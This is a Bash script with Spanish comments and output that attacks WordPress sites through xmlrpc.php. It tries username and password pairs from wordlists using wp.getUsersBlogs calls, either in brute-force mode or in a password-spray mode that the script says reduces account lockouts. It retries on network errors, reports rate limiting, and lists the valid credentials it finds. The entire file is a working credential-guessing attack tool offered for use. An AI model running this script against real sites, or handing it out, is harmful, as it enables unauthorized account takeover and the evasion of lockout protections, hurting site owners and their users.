#!/bin/bash

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"

tmpfile=""
declare -a users=()
declare -a found_creds=()

function print_summary() {
    echo ""
    if [ "${#found_creds[@]}" -gt 0 ]; then
        echo -e "${greenColour}[+] Credenciales validas encontradas:${endColour}"
        for c in "${found_creds[@]}"; do
            echo -e "    ${greenColour}$c${endColour}"
        done
    else
        echo -e "${redColour}[-] No se encontraron credenciales validas.${endColour}"
    fi
    echo ""
}

function cleanup() {
    [ -n "$tmpfile" ] && rm -f "$tmpfile" "${tmpfile}.body" 2>/dev/null
    tput cnorm 2>/dev/null
}

function ctrl_c() {
    echo -e "\n\n${redColour}Saliendo...${endColour}"
    print_summary
    exit 1
}

trap ctrl_c SIGINT
trap cleanup EXIT

function helpPanel() {
    echo -e "\n${yellowColour}[+] Uso: $0 (-u <usuario> | -L <lista>) -w <wordlist> -i <ip> [-U <url>] [-d <delay>] [-r <reintentos>] [-s]${endColour}\n"
    echo -e "\t-u: Un solo usuario a atacar."
    echo -e "\t-L: Archivo con lista de usuarios (uno por linea)."
    echo -e "\t-w: Diccionario de contraseñas."
    echo -e "\t-i: IP o host objetivo."
    echo -e "\t-U: URL completa del xmlrpc (opcional). Por defecto http://<ip>/wordpress/xmlrpc.php"
    echo -e "\t-d: Retardo en segundos entre intentos (opcional, por defecto 0)."
    echo -e "\t-r: Reintentos ante error de red por intento (opcional, por defecto 2)."
    echo -e "\t-s: Modo spray (una contraseña contra todos los usuarios antes de pasar a la siguiente)."
    echo -e "\t    Reduce bloqueos por cuenta frente al modo fuerza bruta por defecto.\n"
    exit 1
}

# Devuelve por stdout el estado del intento:
# success | fail | disabled | neterror | ratelimit | http:<codigo>
function try_login() {
    local username=$1 password=$2 url=$3 retries=$4
    local attempt=0 http_code="000" body=""

# Heredoc sin indentar a proposito (EOF debe quedar en la columna 0)
cat > "$tmpfile" <<EOF
<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>${username}</string></value></param>
<param><value><string>${password}</string></value></param>
</params>
</methodCall>
EOF

    while [ $attempt -le "$retries" ]; do
        http_code=$(curl -s -o "${tmpfile}.body" -w "%{http_code}" \
            --connect-timeout 10 --max-time 20 \
            -X POST "$url" \
            -H "Content-Type: text/xml" \
            --data @"$tmpfile" 2>/dev/null)
        [ -n "$http_code" ] && [ "$http_code" != "000" ] && break
        attempt=$((attempt + 1))
        sleep 1
    done

    body=$(cat "${tmpfile}.body" 2>/dev/null)
    rm -f "${tmpfile}.body" 2>/dev/null

    if [ -z "$http_code" ] || [ "$http_code" = "000" ]; then
        echo "neterror"; return
    fi
    if echo "$body" | grep -qi "services are disabled\|xml-rpc.*disabled"; then
        echo "disabled"; return
    fi
    if [ "$http_code" = "200" ] && echo "$body" | grep -q "methodResponse" && ! echo "$body" | grep -q "faultCode"; then
        echo "success"; return
    fi
    if echo "$body" | grep -qi "Incorrect username or password"; then
        echo "fail"; return
    fi
    if [ "$http_code" = "429" ]; then
        echo "ratelimit"; return
    fi
    echo "http:$http_code"
}

# Modo fuerza bruta: todas las contraseñas de un usuario antes de pasar al siguiente.
function run_brute() {
    local url=$1 delay=$2 retries=$3
    local u p status count total
    total=$(grep -c '' "$wordlist" 2>/dev/null)

    for u in "${users[@]}"; do
        echo -e "\n${yellowColour}[*] Usuario:${endColour} ${blueColour}$u${endColour}"
        local found=0
        count=0
        while IFS= read -r p || [ -n "$p" ]; do
            p="${p%$'\r'}"
            [ -z "$p" ] && continue
            count=$((count + 1))
            printf "\r${blueColour}[*]${endColour} %-25s %d/%d        " "$u" "$count" "$total"

            status=$(try_login "$u" "$p" "$url" "$retries")
            case "$status" in
                success)
                    printf "\n"
                    echo -e "    [+] ${greenColour}$u : $p${endColour}"
                    found_creds+=("$u:$p")
                    found=1
                    break ;;
                disabled)
                    printf "\n"
                    echo -e "${redColour}[-] XML-RPC deshabilitado en el objetivo. Abortando.${endColour}"
                    return 2 ;;
                neterror)
                    printf "\n"
                    echo -e "    ${redColour}[!] Sin respuesta para '$p'. Se omite.${endColour}" ;;
                ratelimit)
                    printf "\n"
                    echo -e "    ${yellowColour}[!] HTTP 429 (rate limiting). Sube el valor de -d.${endColour}" ;;
                http:*)
                    printf "\n"
                    echo -e "    ${yellowColour}[!] Respuesta inesperada (${status#http:}) con '$p'.${endColour}" ;;
            esac
            [ "$delay" != "0" ] && sleep "$delay"
        done < "$wordlist"
        [ $found -eq 0 ] && echo -e "    ${redColour}[-] Sin coincidencia para $u.${endColour}"
    done
    return 0
}

# Modo spray: una contraseña contra todos los usuarios, luego la siguiente.
function run_spray() {
    local url=$1 delay=$2 retries=$3
    local u p status count total
    total=$(grep -c '' "$wordlist" 2>/dev/null)
    declare -A cracked=()

    count=0
    while IFS= read -r p || [ -n "$p" ]; do
        p="${p%$'\r'}"
        [ -z "$p" ] && continue
        count=$((count + 1))

        for u in "${users[@]}"; do
            [ -n "${cracked[$u]}" ] && continue
            printf "\r${blueColour}[*]${endColour} pass %d/%d -> %-20s        " "$count" "$total" "$u"

            status=$(try_login "$u" "$p" "$url" "$retries")
            case "$status" in
                success)
                    printf "\n"
                    echo -e "    [+] ${greenColour}$u : $p${endColour}"
                    found_creds+=("$u:$p")
                    cracked[$u]=1 ;;
                disabled)
                    printf "\n"
                    echo -e "${redColour}[-] XML-RPC deshabilitado en el objetivo. Abortando.${endColour}"
                    return 2 ;;
                neterror)
                    printf "\n"
                    echo -e "    ${redColour}[!] Sin respuesta ($u / '$p').${endColour}" ;;
                ratelimit)
                    printf "\n"
                    echo -e "    ${yellowColour}[!] HTTP 429 (rate limiting). Sube el valor de -d.${endColour}" ;;
            esac
            [ "$delay" != "0" ] && sleep "$delay"
        done

        [ "${#cracked[@]}" -eq "${#users[@]}" ] && break
    done < "$wordlist"
    return 0
}

tput civis

spray=0
while getopts "u:L:w:i:U:d:r:sh" opt; do
    case $opt in
        u) username=$OPTARG ;;
        L) userlist=$OPTARG ;;
        w) wordlist=$OPTARG ;;
        i) ip=$OPTARG ;;
        U) url=$OPTARG ;;
        d) delay=$OPTARG ;;
        r) retries=$OPTARG ;;
        s) spray=1 ;;
        h) helpPanel ;;
        \?) echo "Opcion invalida: $OPTARG" 1>&2; exit 1 ;;
    esac
done

delay=${delay:-0}
retries=${retries:-2}

if ! command -v curl >/dev/null 2>&1; then
    echo -e "\n${redColour}[-] curl no esta instalado.${endColour}\n"; exit 1
fi

# Requiere (usuario o lista), wordlist y (ip o url)
if { [ -z "$username" ] && [ -z "$userlist" ]; } || [ -z "$wordlist" ] || { [ -z "$ip" ] && [ -z "$url" ]; }; then
    helpPanel
fi

[ -z "$url" ] && url="http://$ip/wordpress/xmlrpc.php"

if [ ! -f "$wordlist" ]; then
    echo -e "\n${redColour}[-] No se encontro el diccionario: $wordlist${endColour}\n"; exit 1
fi

# Construir la lista de usuarios
if [ -n "$userlist" ]; then
    if [ ! -f "$userlist" ]; then
        echo -e "\n${redColour}[-] No se encontro la lista de usuarios: $userlist${endColour}\n"; exit 1
    fi
    while IFS= read -r line || [ -n "$line" ]; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        users+=("$line")
    done < "$userlist"
fi
[ -n "$username" ] && users+=("$username")

if [ "${#users[@]}" -eq 0 ]; then
    echo -e "\n${redColour}[-] No hay usuarios validos para atacar.${endColour}\n"; exit 1
fi

tmpfile=$(mktemp) || { echo "No se pudo crear el archivo temporal"; exit 1; }

mode="fuerza bruta"
[ "$spray" -eq 1 ] && mode="spray"

echo -e "\n${yellowColour}Usuarios:${endColour}    ${blueColour}${#users[@]}${endColour}"
echo -e "${yellowColour}Diccionario:${endColour} ${blueColour}$wordlist${endColour}"
echo -e "${yellowColour}Objetivo:${endColour}    ${blueColour}$url${endColour}"
echo -e "${yellowColour}Modo:${endColour}        ${blueColour}$mode${endColour}"

if [ "$spray" -eq 1 ]; then
    run_spray "$url" "$delay" "$retries"
    rc=$?
else
    run_brute "$url" "$delay" "$retries"
    rc=$?
fi

print_summary
exit $rc
